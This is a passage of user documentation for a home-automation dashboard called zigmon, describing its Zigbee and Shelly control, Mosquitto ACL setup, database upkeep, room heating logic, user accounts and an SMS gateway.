exactly as the Zigbee2MQTT frontend does; `TOGGLE` is only used when the
channel has never reported. Some converters - the Shelly Power Strip 4
Gen4's among them - ignore `TOGGLE`, which made a binding look dead. And because a publish the broker refuses looks like success from here, a
set that is never confirmed within six seconds now says which half failed:
the daemon subscribes to the whole base topic, so a command the broker
accepted comes straight back to it. Echo but no action means Zigbee2MQTT
ignored it; no echo means the daemon's MQTT user may not publish there.
`zigmon --check` tests the same thing directly, without waiting for a
button press. On a broker with an ACL the daemon's user needs more than
read access — reading the whole base topic is not enough to *switch*
anything:

```
user zigmon
topic read  zigbee2mqtt/#
topic write zigbee2mqtt/bridge/request/#     # pairing, network map
topic write zigbee2mqtt/+/set                # switching a Zigbee device
topic write zigbee2mqtt/+/+/set              # ...one of its endpoints
```

The probe publishes to `zigbee2mqtt/zigmon-selftest/set` — the same shape a
real command uses, so it tests the permission that actually matters.
Zigbee2MQTT notes once that it does not know a device by that name, which
is expected and harmless — and that one complaint is kept out of the event
log, since it is ours rather than a fault.

**Detect names the relays the way the device does.** It reads the device's
own name and each output's name over the local API and combines them —
`PlugX4-TVLoznice-AppleTV` — with the MQTT prefix preset to the same thing
in lower case, `plugx4-tvloznice-appletv`. A single-relay plug is just the
device name. An output the device leaves unnamed falls back to its number,
and a device that reports no names at all never overwrites a name someone
chose. Anything it renames is listed in the result line, so nothing changes
quietly.

**Control is split into four sections** - Devices, Automation, Alerts &
energy, System - reached from a row of pills under the Editing card, so the
tab shows the handful of cards you came for instead of seventeen at once.
The choice lives in the address (`#control/automation`), so a bookmark or a
reload comes back where you were. Every card still exists and behaves
exactly as before; a section only decides which are on screen.

**A multi-relay box is read in one request.** Asking each channel
separately meant a four-way strip answered thirteen requests per round and,
with the pacing between them, spent most of every fifteen seconds busy with
its own polling - so a click on one of its sockets had to queue behind that.
One `Shelly.GetStatus` now covers every channel: thirteen requests become
one, and the box is busy 7% of the time instead of 80%.

**Commands jump the queue at the device.** Only one request is in flight
per box (that is all the hardware serves anyway), and a switch command goes
ahead of any poll still waiting - while the pacing delay itself is taken
outside that gate, so a waiting poll never holds the box shut.

**The card shows the new state at once.** A plug on Wi-Fi can take a moment
to answer; the socket flips immediately and dims until confirmed, and the
next refresh carries the truth, so a refused switch corrects itself.

**The energy summary is not recomputed from scratch.** Six spans per plug
over the whole samples table is most of what that card costs; yesterday,
last month and last year are periods that have ended and can never change,
so they are worked out once and kept, and the whole answer is held for
fifteen seconds so several open tabs cost one pass rather than one each.
Restarting a plug's counters throws the kept figures away.

**A gateway no longer fills the database with things that never change.**
Asked for its status, a box hands over everything it knows — its serial
numbers, memory sizes, counter reset stamps, per-minute arrays — and all of
it was written every thirty seconds. On one real installation that was 63%
of a 135 MB file, and 45% of every row stored was a value that had never
once changed. Bookkeeping keys are no longer recorded at all, and a gateway
reading is written when it moves, with a point every fifteen minutes so a
flat line still has one. Six polls of an idle strip now write eighteen rows
where they used to write eight hundred.

**A deleted device stays deleted.** A message under a name Zigbee2MQTT has
never listed used to create a device — which is right while the bridge has
not answered yet, and wrong afterwards: a broker replaying a retained
message for a device that was removed put the ghost straight back, every
restart, however often it was erased. Once the device list has arrived, a
name that is not on it is refused, and the log says once an hour which
topic it was. **Look for leftovers** lists those topics too, and offers to
clear them: the daemon writes the empty retained message that deletes each
one and reports which the broker actually took. Doing that needs its MQTT
user to be allowed to write there — `topic write zigbee2mqtt/#` — and when
the broker refuses, the message says so and names the topic, to clear by
hand with `mosquitto_pub -r -n`. A device usually has more than one retained
topic, `…/availability` besides its state, and each is listed separately:
clearing only one leaves the other putting the device back.

**Look for leftovers** on the Recorded data card finds what is still held
for devices the dashboard no longer shows — a rename or a removal leaves the
old name's recordings behind, and on one real installation that was 779,000
readings, 69% of the file. The scan counts them, lists the devices it found
in the Forget dropdown marked `⚠ … gone`, so a single one can be picked out,
and offers to erase the lot. Nothing belonging to a device still in use is
touched. Erasing history, events, everything or one device runs behind that panel
too, and each says in the daemon's log what it is starting and what it
finished with. The card is full width now that it holds all of this.

The size shown is also honest: SQLite reuses its write-ahead journal in
place, so after a compaction that file can sit at the size of the whole
database and was being counted into the total — a 135 MB database read as
270 MB. The journal is folded back in after every compaction and once an
hour besides, and the two are shown apart when one is there.

**Clear out noise** on the Database card applies the same judgement to what
is already stored: it counts first and removes only when asked again. On
that installation it took the file from 135 MB to 60 MB, and every
measurement that ever moved is still there.

**A database job says what it is doing while it does it.** Check, Optimise
and Back up can take a while on a large file, and a button that goes quiet
for half a minute reads as a broken one. Each now opens a panel with a
running bar, the seconds counting up, and the daemon's own log as it
arrives — the job announces its start and its finish there, with the file
size before and after. The panel stays afterwards with the result and how
long it took, green or red. The log is read from its end, not from its
start: it is asked for every second while a job runs, and a log that has
grown for months would otherwise be read whole each time.

**Nothing in the command line is cut to fit.** The listings used fixed
column widths, so a name or an id wider than the guess lost its end — an id
you cannot copy is not an id. Every table now measures its own contents and
sizes each column to the widest thing in it, numbers line up on the right,
and colour marks the level, the state and what a rule or binding does.

**Maintenance leaves the dashboard alone.** Checking, optimising, backing
up or erasing all hold SQLite for as long as they take, and anything that
had to fetch one more row in the meantime waited with them — the page went
to “Connecting…” for a second or two. Three things caused it: resolving a
name still went to the database, the header's row counts were counted
afresh on every refresh, and the caches were emptied a moment before a
VACUUM so the next read landed behind it. Names now resolve from the list
already in memory, the counts are kept for half a minute and never block —
the last ones are shown while the file is busy — and an erase refills what
the dashboard needs before it starts compacting, dropping only the device
it actually removed.

**Reading never makes anyone wait either.** The rows the hot paths need —
a device and its name, the actions a button has sent, a plug's counter
stamp, the whole device list the dashboard rebuilds from — are held in
memory and kept current as they change, instead of being fetched from the
database on every switch and every refresh. A poll that finds nothing new
about its plug no longer rewrites the row either. So a switch command and a
dashboard refresh cost the same whether the database is idle or busy: a
Zigbee command went from 915 ms to 0.2 ms during a VACUUM, and a status
build from 870 ms to 2 ms.

**Recording never makes anyone wait.** Everything the daemon writes while
handling a message — samples, snapshots, events, last-seen — goes onto a
queue drained by one background thread, and the config lists that decide
what to fire (bindings, rules, scenes, sequences, schedules) are held in
memory. So the automation path touches no database lock at all: a VACUUM
or an online backup, which hold SQLite for as long as they take, can no
longer stall a button press or back up the MQTT client thread. Maintenance
flushes the queue first, so a backup still captures everything.

**Switching is close to instant, and stays that way under load.** Per-host
pacing (so one relay is never hammered) used to sit behind one lock shared
by every plug — a slow background poll on any device could stall a click
on an unrelated one by up to a second. Pacing is now per host, so devices
never wait on each other. A command that meets a device's own HTTP 429
(rate limited) also fails fast — one short retry instead of the patient
multi-attempt backoff that suits an unattended background poll.

**Switching is close to instant.** A command to a plug takes a priority
lane past the polling pace (`plug_command_gap`, default 0.05 s, vs.
`plug_min_request_gap` for background polls), a toggle is a single
`Switch.Toggle` round trip, and the dashboard repaints the moment the relay
confirms — the power and energy figures follow from a background poll a
second later, so nobody waits for them. Click-to-repaint is typically
~100 ms on a LAN; a Zigbee button or a motion sensor reaches the relay
within a few milliseconds of its MQTT message (the relay is driven before
the event is even written to disk). Both gaps are tunable under
Settings → Polling.

It updates **live**: besides the five-second refresh, the page keeps one
long-poll request open (`/api/wait`) that the daemon answers the moment
anything visible changes — a report arriving, a plug switching, a binding or
rule firing, the bridge going up or down. A button press shows on every open
dashboard in well under a second; the five-second tick stays as the safety
net, and if the wait endpoint is unreachable the page simply behaves as
before. Each open tab holds one php-fpm worker for up to 25 s at a time,
which the default pool of dozens absorbs without noticing. Refreshing pauses
when the tab is hidden and can be paused by hand from the indicator in the
corner. Control buttons carry a
plain label and an icon; resting the pointer on one for five seconds
reveals the exact request behind it and what it does.

**Signing in.** Since 5.19 the dashboard signs people in by name and
password, as otp does; the one PIN everybody shared is gone. Nothing that
changes something works without a sign-in - from the name pill in the
header, the *Signed in* card on Settings, or simply by clicking any action,
which offers to sign in first. Each account has a role:

* **Read only** sees the house (also when the view is not public) and
  changes nothing - a tablet on the wall;
* **Operator** uses the house: switches the sockets and lights, runs scenes
  and sequences, sets the rooms and their heating, hands a light back to its
  rules, clears the alerts;
* **Administrator** also looks after it: every setting, the security, the
  accounts, the firewall, the certificate, upgrades, backups.

*The house shows itself without a sign-in* (`public_view`, Settings -
Access) decides whether the house may be watched by anybody who reaches the
page; off, the page is a sign-in page and nothing else until somebody signs
in. The sign-in is kept by the relay in a cookie the page's script cannot
read (HttpOnly, SameSite=Strict, Secure over HTTPS) and survives a restart
of the daemon; it ends when it is not used for `session_idle_min` (240) and
after `session_hours` (720) at the latest. Five wrong passwords from one
address (`login_tries`, `login_wait_min`) and signing in from there waits a
quarter of an hour; a name nobody has is answered exactly like a wrong
password, and as slowly. Passwords are PBKDF2-SHA256 hashes.

The first start of 5.19 - a new installation, or one coming from the PIN -
makes the account **admin**, with a password in `/var/lib/zigmon/first-login.txt`
(root only), which has to be changed at the first sign-in and is deleted
then. The accounts are kept on Settings - Access (an administrator's), with
who is signed in and a way to end any of them, or on the command line as
root: `zigmon --accounts`, `--account-add NAME ROLE`, `--account-password
NAME` (a forgotten password), `--account-role`, `--account-off`/`--account-on`.
The command line itself is let in by a key the daemon writes for root
(`/run/zigmon/cli-key`), which the web server cannot read - the API token,
which it can, is not enough on its own. Putting a database back keeps the
accounts as they are.

**PIN accounts** (5.19.1) unlock the page as the PIN did before 5.19: a box
per digit, a while to unlock for (5 minutes to 4 hours; up to 12 on the
sign-in page), *Editing 14:25* counting down in the header. Each has a role
like any other account and a PIN of its own, which tells it apart; made on
Settings - Access (*Signs in with: a PIN*) or by root with `zigmon
--account-add NAME ROLE --with-pin`. Where there is one, the dialogue asks for
the PIN first and offers the name and the password one click away. The PIN
of config.json becomes such an account (an administrator) only on the start
that comes straight from before 5.19.

**Every chart pans and zooms**, as in upsmon: drag to move the window,
wheel to zoom around the pointer, pinch on a touch screen, double-click or
the *reset view* button to return. The view survives the five-second
refresh while it is zoomed. Nothing is re-fetched while panning. The tab icon is coloured by
the overall verdict.

## Rooms and heating

**A room is a name and the things in it.** Under Control → Automation, make
rooms and drop devices into them: a thermometer, a valve, a window sensor,
the plugs that live there. Nothing is forced — anything unassigned simply
stays out of the way. Rooms group the energy table, and they give the
Heating screen something to hold a temperature for.

**The Heating tab holds a temperature per room.** Each room has three
numbers — *comfort*, *eco* and *night* — and a plan of which one applies
when: a time, a level, and the days it runs on. The room reads its own
thermometer — several in the room are averaged, a valve's own measurement
is used only if there is nothing better — and whichever level is current is
pushed to every valve in the room. When a room has no thermometer, or has
several and one of them is the one that matters, the **Thermometer** choice
on its card picks the reading it holds against: the room's own are offered
first, then any other on the dashboard, marked *elsewhere*. *Right
now* overrides the plan with one level until it is put back to *follow the
plan*.

**Away** drops every room to one temperature until it is switched off —
the holiday switch. It replaces the temperatures, and leaves the two levels
that are not temperatures alone: **Off** stays shut and **Max** stays wide
open, because each of those is an outright choice rather than a number to
override — exactly as a hand-set number beats away. **An open window** in a room drops that room to 5 °C
while it is open, and picks up where it left off when it is shut; the
window sensor just has to be in the same room. With **Heating control**
off nothing is sent at all and the valves keep whatever they were last
told.

**A knob turns a number.** *Set to* on a numeric target has three moods:
**to** a value, **up by** a step, **down by** a step. Bind a rotary
button's *rotate_right* to a valve's target temperature *up by 0.5* and
*rotate_left* to *down by 0.5* and the knob is a thermostat dial; the
daemon keeps inside the range the device announced. It works for any number
a device will accept — a bulb's brightness, a blind's position.

A radiator head is a sleeping device, and a knob is handled with that in
mind: quick clicks accumulate on what was last *sent* rather than on a
report that is minutes old, the card shows the new number the instant the
knob moves, and a burst of clicks goes out as one message a quarter-second
after the last click, carrying the final number — ten messages queued in
the bridge and delivered one by one when the head wakes were what made a
knob feel dead. What no software can do is light the head's own display: a
Tuya head wakes its screen for its own dial, not for a value arriving over
the radio.

**What the sensor reads, while you set the rule.** Hovering the source,
the reading or the threshold of a sensor rule shows the device's current
values in a card, the chosen reading marked and the rest listed under it,
with when it last reported; a binding's device shows its last press. A
threshold is set against what is, not from memory.

**A hand on the room, not on the valve.** There are two ways to turn a
knob at a radiator. Pointed at the valve's own target temperature it sets
the head directly — and the room's plan knows nothing of it, keeps its own
number, and pushes it back at the next change of level. Pointed at 🔥
*temperature in ⟨room⟩* the knob turns the *room*: the card shows *set by
hand, 22.5 °C until 22:00, then the plan again*, every valve in the room
follows, a window still stops it, and when the plan's next step comes the
hand is lifted and the plan has the room back (four hours, if there is no
plan). That is the one to use — the same thing a hotel thermostat does when
you nudge it. The card has the same hand on it: **By hand** with a slider, the number
beside it, and *for how long*. The slider only speaks when it is let go —
dragging it moves the reading, not the valves — and arrow keys step half a
degree. While any control is in use — a slider held, a dropdown open, a cursor in a
field — the page stops rebuilding cards, so a reading landing mid-gesture
cannot close the menu, discard what was typed or pull the tile out from
under the thumb; it catches up the moment you let go — until the plan's next step by default,
or a fixed 1 / 2 / 4 / 8 / 24 hours that holds through whatever the plan
does meanwhile. The presets are one tap away on the same line — **Comfort · Eco · Night
· Max · Off · Plan** — and a button can do the same: *heating in ⟨room⟩ set to
comfort* on one press, or **set to next** to cycle plan → comfort → eco →
night → plan on a single button. *Back to the plan now* on the card, or
*set to plan*, lifts a hand-set number early.

*Where the "until" comes from:* with a plan, the hand lasts until the plan
would next change level — set 22 at 15:00 with a *night* step at 22:00 and
it reads *until 22:00*; the plan's own steps are the natural moment to give
the room back. With no plan, or with a level picked on the preset buttons,
four hours. A fixed length chosen on the card or sent with a target
(`hold_s`) overrides both.

**Heating is a target like a plug.** Every place that offers a target — a
button binding, a sensor rule, a scene, a schedule, a presence trigger —
also offers 🔥 *heating control* and 🔥 *heating away mode* (on, off,
toggle) and 🔥 *heating in ⟨room⟩* with **set to** plan / comfort / eco /
night / max / off — and, since 5.12, 📜 **a script**, 🗣️ **one of the
prepared reports** (`tell:house`, `tell:cost`…) and the four things the house
does to itself that nothing could ask for before: the month's energy, what is
still on, fetching the lists, and holding the texts. A script is the one place
a value can be worked out rather than written down, and **set to** now takes
one from anywhere: `set:{outside_c}` on a valve, `set:{Obyvak.temperature}` on
another room. So *everybody left → away on*, *first one home → away off*,
*the bedroom button → bedroom to night*, *22:30 → every room to night* are
ordinary entries, and a *Leaving* scene can switch the lights off and the
heating to away in one go. Setting a room's level this way is the same as
pressing one of the preset buttons on its card; *plan* hands it back to the
plan.

**Which sensors count as a room's windows.** With *stop for an open window*
on, the card lists the door and window sensors — the room's own first,
the rest marked *elsewhere*. Unticked, every contact in the room counts;
tick some and only those do, so a balcony door can stop the radiator while
the door to the hall does not.

**Control can be paused per room as well as for the house.** The
*Heating control* switch at the top stops everything; the **Control**
switch beside a room's temperature stops that room alone. Off, the room
keeps its plan, its three temperatures and its thermometer, but nothing is
sent — the heads keep whatever they were last told — and the card says
so. It is a target too: 🔥 *heating control in ⟨room⟩* takes on, off or
toggle from any binding, rule, scene, schedule or presence trigger, so a
button by the bed can hand the bedroom's valve back to its own dial for
the night and a schedule can take it back in the morning.

**A room without heating is switched off as a room.** The switch beside a
room's name on its card says whether it is heated at all. Off, the card
folds down to its title, nothing is ever sent for it, and it drops out of
the *heating in ⟨room⟩* targets — a bathroom with electric underfloor
heating on a plug, or a hallway with no radiator, is still a room for the
energy table and the sensors in it, just not one the Heating tab argues
with.

A valve's own card (Sensors) carries the same slider for its target, and
shows what it is doing rather than what it is configured with: the settings
a head keeps — its minimum and maximum, its own comfort/eco numbers, the
window-detection parameters — stay in *All values* and out of the headline,
and `position` on a head reads *valve open*. A remote's headline is the last
thing pressed or turned, not its cell voltage.

**What each head is doing is on the card.** A line per valve: what it is
holding, what its own thermometer reads (with the offset if one is set), how
far the valve is open, whether it is heating, its mode and its battery.
**Close** shuts the valves in that room. Where a head has an *off* mode
that is what is sent, because a set point of five does not actually close a
valve whose own thermometer sits on the radiator and reads warmer than the
room — it just carries on regulating; heads without an off mode get five
degrees, frost protection only. Any preset other than *Off* opens the head
again. **Max** is the other end of the same idea: no temperature to hold at
all, each head asked for the highest set point it itself admits to (thirty
degrees where it reports none), so the valve stands wide open and the room
heats as hard as it can until something else is chosen.
which is the same as the *Off* preset and is why it is offered on the room
rather than on the single head: a head shut on its own would be reopened by
the room on the next round. On a head that is in no room the button is its
own: the head's *off* mode where it has one, its lowest number where it does
not. **Match the room** sets the head's `local_temperature_calibration` so its
reading agrees with the room's thermometer — a head sits on the radiator and
runs warm, and the offset is there for exactly this.

**One vocabulary, not three.** A TuYa head has its own preset list —
*schedule, manual, boost, complex, comfort, eco, away* — which is the
firmware's own language and means nothing to the plan: *away* is the head's
away temperature, *schedule* is the head's weekly programme, *comfort* is a
number stored in the head. Zigmon's six — **Comfort, Eco, Night, Max, Off,
Plan** — belong to the room, and they are what a button, a rule, a scene
and the Heating tab all speak. So when a head is in a room, its own card
offers exactly those six and the room's slider, not the firmware's list;
the head is kept in manual underneath and its own words never appear. A head
that is in no room keeps its raw controls, since then there is nothing else
driving it, and says so on the card with where to put it.

**A head with a mind of its own is taken off it.** A TuYa/Immax TS0601
radiator head keeps its own weekly programme, an away mode and a preset,
and while any of those is in charge a set point sent to it is obeyed for a
moment and then overwritten by its own schedule — which is what makes such
a head look like it ignores the dashboard. Before driving one, zigmon puts it in **manual** (`preset`), clears **away
mode**, and clears **force** — that last one pins the valve open or shut
whatever the set point says, and a head left on `force: open` heats flat out
and looks like it is ignoring the dashboard.

The mode needs care, because the words lie. On a TS0601 head `heat` means
*heat continuously without regulating* and `auto` means *hold the set
point* — the opposite of what they read like, and Zigbee2MQTT says so on
the device page. Those heads give themselves away by also exposing a
`preset`, which is what decides schedule versus manual there, so zigmon asks
for **auto** on them and **heat** on a plain thermostat that has no preset.
Every one of these is sent only when the head's own report says it is not
already there, so it is a message or two the first time and nothing
afterwards.

**The valves are simply the ones in the room.** There is nothing to
configure beyond putting a head into a room under Control → Automation →
Rooms; any device there with a target temperature is driven, and the card
names them. A head not in any room is left alone.

A valve is only told something when the wanted temperature has actually
changed, because a radiator head is a sleeping device and re-sending the
same number every minute would keep its radio awake for nothing. The same
reason means a change takes effect when the head next talks to the mesh —
seconds to a few minutes.

**A socket can be marked as a light.** In Plugs and sensors each channel has
a *What it is* column: **a socket** or **a light**. A light is polled,
switched, bound, ruled and recorded exactly like any other plug; what the
mark changes is how it reads.

A light also *reads* as one: its icon is a bulb rather than a socket
wherever it appears — its card, the device lists, and every dropdown that
offers a target — and the dropdowns group the lights together and sort by
name only within the group, so picking one is not a hunt through the
sockets.

**The energy table groups by room, and opens closed.** Each room is a line of
its own carrying the room's totals, and what is not in a room sits under
*Not in a room*; with no rooms set up at all, the sockets of one physical box
make a line instead (a four-way strip is one row, `PlugX4-TVLoznice · 4
sockets`) and the rest sit under *Single plugs*. Everything starts folded, so
the card is a handful of lines rather than a wall of numbers; click a group
to open it, **Open every group** for the lot, and what you opened is still
open after a reload. Every plug still
opens its last thirty days as bars, and so does *All plugs*.

**A monthly summary** goes out on the first of the month: what last month
drank, what it cost, the five biggest, and the totals by room. `zigmon
--monthly` prints it on demand; `"monthly_summary": false` in `config.json`
switches the notification off.

**Devices are sorted by what they are.** A device's kind is read from what
it reports, not from its name: ♨️ a radiator valve, 🎛️ a knob, 🔘 a button,
🚶 a motion sensor, 🚪 a door or window contact, 🌡️ a thermometer, 🔌 a
socket, 💡 a light, 📡 a router or coordinator. Every list and dropdown
groups by that and sorts by name inside the group, so picking the valve or
the PIR is not a hunt.

**Moving cards is a mode of its own.** Unlocking editing used to make every
tile on the Overview, Sensors, Plugs and WiFi draggable at once, which meant
a slider or a menu on a card could not be used without the card coming
along. There is a **Rearrange** switch beside the lock now — on the tabs that have
movable cards (Overview, Plugs, Sensors, Buttons, WiFi, Heating) and nowhere
else — off by default,
and while it is off the cards stay put and their controls work normally. On,
the movable cards are outlined, their controls are held inert, and a card
can be dragged where it belongs; the order is saved as before. It goes back
off when editing locks. The Heating cards move too, and the order they are
left in is the order the rooms keep everywhere else.

**Sections.** Every editor under Control can be folded into named
sections — *Ložnice*, *Workshop*, *TV* — with **➕ section** at the bottom
of the list. A section is a fold with a name, a count, a rename and a
remove (its rows go back to *Everything else*); it opens closed, and what
you open stays open for the session. Rows drag into a section, between
sections and within one; a section drags above another by the handle on its
header. Each section header has its own **➕** that adds a new row straight
into that section, and every row has a **Move to** menu — a click on its
handle or a right-click on the row — listing the sections, *Everything else*,
and *New section…*. All of it is part of that editor's unsaved changes and is written by
its **Save** button — the section a row sits in travels with the row, and
the order of the sections with the editor — so it survives restarts and
backups. Sections are for the eye only: a binding fires the same whether it
sits in a section or not, and the order the daemon considers rows in is the
order they are shown, top to bottom across the sections.

**Lists can be dragged into order.** Every editor under Control — button
bindings, sensor rules, scenes, rooms, sequences, schedules, people,
presence triggers, messages, devices and gateways — has a handle on the left
of each row. Drag it and the row moves; the new order is part of that
section's unsaved changes, and its **Save** button writes it like any other
edit. It is not decoration: bindings, rules and scene steps are considered
in the order they are listed, so being able to move one above another is
part of saying what should happen. A device drags with all its channels, a
rule with its clock line, a gateway with what it reported. Entries from
`config.json` have no handle, since they are not ours to reorder. The
handle only appears while editing is unlocked.

## Commands over MQTT

A Shelly Gen2+ box can take its commands over the broker as well as over
HTTP: with *RPC over MQTT* on, it listens on `<prefix>/rpc` and does what
the message says. Under Plugs and sensors every box has an **MQTT** strip:
a switch, the box's prefix, and the broker, username and password the box
should use. With the switch on, zigmon sends the box's commands — switch,
pulse, reboot, reset counters — as one publish to `<prefix>/rpc` instead of
opening a TCP connection and an HTTP round trip; HTTP stays as the fallback
when the broker is down. The box's pushes are read as before.

**Set the box up** writes it all into the box (`MQTT.SetConfig`: broker,
credentials, prefix, RPC over MQTT and status notifications on) and restarts
it, so nothing has to be typed into the box's own web page. The connection
type is the one the box's page offers: **TLS, no validation** (encrypted,
the certificate not checked — `ssl_ca: "*"`, the box's default with a TLS
broker and the pre-filled choice when this daemon's own broker uses TLS),
**TLS with a CA on the box** (`ca.pem` uploaded to the box beforehand), or
**No TLS** on the plain port; the port in the broker field follows the
choice. The box's own password is the one already stored for that address,
so the page need not carry it.

**Each box has its own broker account.** The user and password on a box's
MQTT strip belong to that box and are kept with it, like its HTTP password:
the field reads **(kept)** once one is stored, blank leaves it alone, and the
bin beside it clears this box's own. `plug_mqtt_user` and
`plug_mqtt_password` in `config.json` are only the fallback for a box that
has none — handy when every box does share one account, which is the usual
arrangement
— and their prefixes live under `plug_mqtt_root` (*shellies*), so the MQTT
strip comes pre-filled with the shared account and a suggested prefix such
as `shellies/plug-tst`, and *Set the box up* uses the shared password when
the field is left blank. One ACL block then covers every box:

```
user plug
topic readwrite shellies/#
topic write zigmon/rpc

user zigmon
topic read  shellies/#
topic write shellies/+/rpc
topic readwrite zigmon/#
```

(the zigmon lines on top of the zigbee2mqtt ones it already has; `kill
-HUP` mosquitto to reload). A box publishes its reports under its prefix
and answers RPC on `zigmon/rpc`; zigmon writes commands to `<prefix>/rpc`
and pings itself on `zigmon/ping`.

**What the broker must allow** (Control → System) lists every topic this
dashboard needs — the Zigbee feed, the `set` topics, `zigmon/#` for the
answers and the round-trip ping, and for each box with MQTT on its own
`<prefix>/rpc` and `<prefix>/#` for both accounts — and ticks each against
what `/etc/mosquitto/acl` actually allows, reading the file the way the
broker does (`user`/`topic` lines, `+` and `#`). What is missing is shown
in red and repeated underneath as a block to paste in;
`kill -HUP $(pidof mosquitto)` reloads it. `zigmon --check` prints the same
list and the same block. Set `mqtt_acl_file` when the file is elsewhere; a
broker on another machine simply says the file could not be read and lists
the lines anyway.

Mosquitto keeps its ACL to itself (`0600 mosquitto:mosquitto`), so the
daemon needs one read on it. `install.sh` asks for exactly that — `setfacl
-m u:zigmon:r /etc/mosquitto/acl`, or the mosquitto group and `0640` where
there is no `setfacl` — and when it cannot, the check and the card print the
command to run rather than leaving a puzzle.

**Test MQTT** on the strip asks the box over the broker and says which link
in the chain is broken rather than only that nothing came back. It listens
to the command topic itself: when its own message comes back, the publish
went through and the silence is the box's side — the prefix, its *Enable
RPC over MQTT*, or its way back on `zigmon/rpc`; when even that does not
return, the broker dropped the message, which it does without a word when
the ACL forbids it. Either way the answer names the missing ACL line if the
file has one. **Which road a command took** is in the event and in the log: *switched on
from the dashboard (over MQTT)*, and *went over HTTP after MQTT stayed
silent* when the fallback had to step in. **Talking to the boxes** in the
settings has two switches for this: **MQTT only** stops the fallback
altogether, so a box set up for MQTT is driven over MQTT alone and a silence
is reported rather than papered over (off by default; boxes without MQTT are
unaffected either way), and **Debug** writes every command, every MQTT
message in and out, and every decision to the log — with a second switch to
put the same in Events, where they can be read without a shell. Debug is a
great deal of writing; it is meant to be switched on while something is
being chased and off again afterwards.

Every command works the same way, without waiting: the box acts on the
publish, so the answer is watched for in a thread of its own rather than
held against the button. When it does not come within two seconds — a
broker drops a message the ACL forbids without a word — the same command
goes over HTTP, the log says so once per box per ten minutes, and it lands
in the events.

Two actions that only a box can do, **reboot the box** and **reset its
counters**, are in every Do list for a plug target — bindings, rules,
scenes, schedules — over MQTT or HTTP alike.

## A head turned by hand

Zigmon only writes to a valve when the room's wish changes, so turning the
knob on the head has always stuck: nothing puts it back until the plan moves
on or somebody picks a preset. That is right for a quick "warmer for the
evening" and wrong for a head somebody nudged in passing, so both are now
choices.

**By hand on the head** is a room mode beside Comfort, Eco, Night, Max, Off
and Plan. In it the room is the head's own business — nothing here writes to it
at all, and the card shows what it is holding. Picking any other mode takes
the room back.

**Put the room's setting back**, in the settings, is the other way: give it a
number of minutes and a head that has drifted from what the room asked for by
more than *heating_enforce_delta* (0.4 °C by default) is told again after that
long, with an event saying so — *"Topeni-Loznice was left at 24.0 °C, Loznice
wants 21.0 °C - saying so again"*. Zero, the default, leaves a turned knob
alone. The grace period matters: a head reports its own turning within
seconds, and putting it back instantly would make the knob useless.

## The SMS tab

Between Devices and WiFi: everything the gateway has said and heard, and a
place to write. **Inbox**, **Outbox** and **Everything** are the three views;
each message shows who it was (a person's name where the number is known),
what it said, when, and whether it got through. The arrow beside one answers
it — an incoming message fills in its number, an outgoing one fills in the
text as well — and the bin forgets a single message, or *Forget them all*
the lot. Nothing there is unsent by forgetting it; it is only the record
this end.

Writing one works like an alert: tick whoever it goes to (anybody with a
number on their card) or type a number, then write. **Ctrl+Space** — or just
typing `{` — offers every fact with an example of what it would say now, a
device name and a dot lists that device's own readings, and **Emoji** is
there too. Underneath, the preview shows the message as it will actually
arrive, filled in, with the character count and how many parts it will take.

## An SMS gateway

A box with a SIM card — a Teltonika TRB140 and its relatives — so an alert
still arrives when the internet does not, and so a phone with no data can
switch something. **Control → System → SMS gateway** takes its address, port,
username and password, and which of the two interfaces it speaks: `cgi` (the
older query one, `/cgi-bin/sms_send`) or `rpc` (RutOS's JSON API, which is
logged into for a token). **Test** with a number sends one real message;
without one it only asks the gateway whether it is there and whether the
password is right. **Send one now** and **Read the inbox** are there for when
something looks wrong.

**Who it involves** is a grid on the same card, one line per person: their
number as it stands on their card under Presence, and two ticks — *gets
alerts* and *may command*. An alert goes to everybody ticked on the left,
alongside ntfy and Telegram; only the numbers ticked on the right may ask
for anything, and a number on a card that has not been ticked is refused by
name rather than treated as a stranger. Having a number is not permission
by itself. The two boxes above take extra numbers that belong to nobody on
the list.

**The gateway is a device of its own.** Once it is switched on it is asked
about itself on the same beat that reads the inbox, and what it says —
signal, reference signal, quality, signal-to-noise, operator, network, SIM
state, and how many messages went each way today — is recorded like any
other device's readings. It appears among the sensors as 📶 *SMS-Gateway*
with its signal as the headline, charts in History like everything else, and
can be the source of a rule: *signal below −100 dBm for ten minutes → tell
me* is written the same way as any other.

**A person has a number.** Put it on their card under Presence and three
things follow: a text from that number is known to be theirs, so `{person}`
can be quoted in the answer and *away* needs no name; that number may give
commands without being listed anywhere else; and an alert can be addressed
to the person rather than to a number — a message's **By SMS to** takes names
as well as numbers, and empty means the gateway's own list.

**Being at home is a target.** 👤 *Falco being home* takes on, off and
toggle from a button, a rule, a schedule or a text, and goes in by the same
door a phone's shortcut uses, so arriving and leaving fire exactly as they
would. 👤 *whoever sent the message being home* is the useful one for SMS:
one command, *away*, serves the whole household.

**A number nobody owns** is reported and does nothing: an event, and a
notification saying who wrote and what they wrote.

**What a text message may do** (Control → Automation) is the other
direction: a word to listen for and what it switches, from the same target
list everything else uses — *lights off*, *heating eco*, *away*. Only numbers ticked for
commands may do so, matched on the last nine digits so `+420777123456` and
`777123456` are one phone; a line can be opened to
anybody, which is meant for questions rather than switches. The answer that
goes back is yours to write and may quote any fact, including
`{sms_from}` and `{sms_text}`: *"Inside 21.5 C, heating yes, 2 devices
quiet."* A line with an answer and no target switches nothing — a way to ask
the house how it is. Right-click a command to try it without a phone.

**The gateway can push instead of being asked.** Give **sms_push_secret** a
word and the settings card prints the address to paste into the gateway's own
*SMS forwarding to HTTP* page; a message then arrives in a second rather than
waiting for the next look in the inbox. That one path is the only one that
accepts the agreed word in place of the API token, and nothing else on it
does. Polling stays as the fallback.

**The modem is asked over its own bus.** RutOS answers `gsm.modem0` on
`/ubus`, which knows far more than the status page: signal, reference signal,
quality, signal-to-noise, operator, network mode, SIM state, cell, roaming,
the modem's temperature and **how much data the SIM has spent this month and
today** — all recorded as readings, so `{data_month_mb}` can go in an alert
and a rule can watch the signal. **sms_status_via** chooses `auto` (the bus,
falling back to the status page), `ubus` or `cgi`.

**Numbers go out the way the gateway asks for them** — 00 and the country
code, per Teltonika's own documentation — while they are written +420 777 123
456 everywhere a person sees them; **sms_number_format** turns that off.
Sending to a group the gateway itself knows is written `group:name`.

**Test** now says what it found: *"the gateway answered — Vodafone CZ on LTE,
signal −71 dBm, SIM ready, 700 MB this month, 0 messages in the inbox"*.

The inbox is read on its own thread, so a gateway that has gone away cannot
hold up the heating or the watchdogs.

## One summary of the day

Set **digest_at** (Control → System → Settings) to a time and one message
